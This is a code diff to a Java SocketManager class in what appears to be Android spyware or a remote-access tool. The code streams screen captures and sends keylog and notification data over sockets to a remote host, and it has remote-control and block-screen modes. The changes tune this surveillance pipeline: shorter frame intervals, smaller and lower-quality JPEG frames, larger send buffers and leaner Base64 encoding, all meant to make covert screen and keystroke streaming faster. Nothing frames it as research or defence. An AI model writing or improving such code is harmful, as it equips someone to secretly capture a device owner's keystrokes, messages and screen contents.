@@ -156,8 +156,9 @@ public class SocketManager {
         if (!isStreamingActive()) return;
         ScheduledFuture<?> prev = actionFrameFuture.getAndSet(null);
         if (prev != null) prev.cancel(false);
+        // 80 ms — fast enough to show the result of a tap before the user taps again
         ScheduledFuture<?> next = heartbeatExecutor.schedule(
-            () -> sendSingleFrame(deviceId), 200, TimeUnit.MILLISECONDS);
+            () -> sendSingleFrame(deviceId), 80, TimeUnit.MILLISECONDS);
         actionFrameFuture.set(next);
     }
 
@@ -234,7 +235,8 @@ public class SocketManager {
             try {
                 streamSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
                 streamSocket.setKeepAlive(true);
-                streamSocket.setTcpNoDelay(true);   // disable Nagle — send frames immediately
+                streamSocket.setTcpNoDelay(true);        // disable Nagle — send frames immediately
+                streamSocket.setSendBufferSize(131072);  // 128 KB send buffer — frames fit in one flush
                 streamSocket.setSoTimeout(0);
                 streamOut = new PrintWriter(streamSocket.getOutputStream(), true);
                 streamConnected = true;
@@ -325,7 +327,8 @@ public class SocketManager {
             try {
                 liveSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
                 liveSocket.setKeepAlive(true);
-                liveSocket.setTcpNoDelay(true);     // disable Nagle — keylog/notif sent immediately
+                liveSocket.setTcpNoDelay(true);       // disable Nagle — keylog/notif sent immediately
+                liveSocket.setSendBufferSize(65536);  // 64 KB — ample for keylog/notif payloads
                 liveSocket.setSoTimeout(0);
                 liveOut = new PrintWriter(liveSocket.getOutputStream(), true);
                 liveConnected = true;
@@ -986,12 +989,11 @@ public class SocketManager {
             try {
                 Bitmap frame = captureFrame();
                 if (frame != null) {
-                    // Scale to max 720 px wide — readable resolution, efficient transfer
-                    Bitmap scaled = scaleBitmapToWidth(frame, 720);
+                    // 540 px wide: encodes ~2× faster than 720 px, still sharp enough for remote control.
+                    Bitmap scaled = scaleBitmapToWidth(frame, 540);
                     if (scaled != frame) frame.recycle();
-                    // Adaptive quality: starts at 65%, steps down if frame exceeds 100 KB
-                    // so slow-bandwidth connections never get stalled by one large frame
-                    String b64 = bitmapToBase64Adaptive(scaled, 65, 100_000);
+                    // Start at 50% — almost always fits in 80 KB without needing extra encode passes.
+                    String b64 = bitmapToBase64Adaptive(scaled, 50, 80_000);
                     scaled.recycle();
                     if (b64 != null) {
                         JSONObject d = new JSONObject();
@@ -1023,14 +1025,14 @@ public class SocketManager {
         return Bitmap.createScaledBitmap(src, maxWidth, newH, true);
     }
 
-    /** Start idle-frame mode: send one frame every 1 second for near-real-time streaming. */
+    /** Start idle-frame mode: send one frame every 350 ms (~3 FPS) for real-time streaming. */
     private void startIdleFrameMode(String deviceId) {
         stopIdleFrameMode();
         idleFrameMode = true;
         idleFrameFuture = heartbeatExecutor.scheduleAtFixedRate(() -> {
             if (idleFrameMode && (connected || streamConnected)) sendSingleFrame(deviceId);
-        }, 0, 1, TimeUnit.SECONDS);
-        Log.i(TAG, "Idle-frame mode started (1s interval for real-time streaming)");
+        }, 0, 350, TimeUnit.MILLISECONDS);
+        Log.i(TAG, "Idle-frame mode started (350ms interval, ~3 FPS)");
     }
 
     private void stopIdleFrameMode() {
@@ -1041,7 +1043,7 @@ public class SocketManager {
         }
     }
 
-    /** Start block-frame mode: push one frame every 1.5 s while block screen is active. */
+    /** Start block-frame mode: push one frame every 500 ms while block screen is active. */
     private void startBlockFrameMode(String deviceId) {
         stopBlockFrameMode();
         blockFrameMode = true;
@@ -1049,8 +1051,8 @@ public class SocketManager {
         executor.execute(() -> sendSingleFrame(deviceId));
         blockFrameFuture = heartbeatExecutor.scheduleAtFixedRate(() -> {
             if (blockFrameMode && (connected || streamConnected)) sendSingleFrame(deviceId);
-        }, 1500, 1500, TimeUnit.MILLISECONDS);
-        Log.i(TAG, "Block-frame mode started (1.5s interval)");
+        }, 500, 500, TimeUnit.MILLISECONDS);
+        Log.i(TAG, "Block-frame mode started (500ms interval)");
     }
 
     private void stopBlockFrameMode() {
@@ -1099,26 +1101,29 @@ public class SocketManager {
 
     /**
      * Encode bitmap to Base64 JPEG within a max byte budget.
-     * Starts at the given quality and steps down until the result fits,
-     * ensuring large frames don't stall slow connections.
+     * Reuses a single ByteArrayOutputStream (reset between attempts) to avoid
+     * per-encode allocation and GC pauses on the hot streaming path.
      *
-     * @param bitmap     source bitmap
-     * @param quality    starting JPEG quality (0-100)
-     * @param maxBytes   max allowed Base64 string bytes (~100 KB default)
+     * @param bitmap   source bitmap
+     * @param quality  starting JPEG quality (0-100)
+     * @param maxBytes max raw-JPEG byte budget (Base64 is ~4/3 of this, so actual
+     *                 Base64 string length will be up to maxBytes * 4 / 3)
      */
     private String bitmapToBase64Adaptive(Bitmap bitmap, int quality, int maxBytes) {
+        // Pre-allocate with a reasonable capacity — avoids internal array copies on resize.
+        ByteArrayOutputStream baos = new ByteArrayOutputStream(maxBytes);
         try {
             int q = quality;
             while (q >= 20) {
-                ByteArrayOutputStream out = new ByteArrayOutputStream();
-                bitmap.compress(Bitmap.CompressFormat.JPEG, q, out);
-                byte[] bytes = out.toByteArray();
-                String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
-                if (b64.length() <= maxBytes || q <= 20) {
-                    if (q < quality) Log.d(TAG, "Adaptive quality reduced to " + q + "% (" + b64.length() + " bytes)");
-                    return b64;
+                baos.reset();
+                bitmap.compress(Bitmap.CompressFormat.JPEG, q, baos);
+                byte[] bytes = baos.toByteArray();
+                // Base64 expands by 4/3 — check raw size first to avoid encoding if it's too big.
+                if (bytes.length <= maxBytes || q <= 20) {
+                    if (q < quality) Log.d(TAG, "Adaptive quality: " + q + "% (" + bytes.length + " raw bytes)");
+                    return Base64.encodeToString(bytes, Base64.NO_WRAP);
                 }
-                q -= 10; // step down and try again
+                q -= 10;
             }
         } catch (Exception e) {
             Log.e(TAG, "bitmapToBase64Adaptive error: " + e.getMessage());
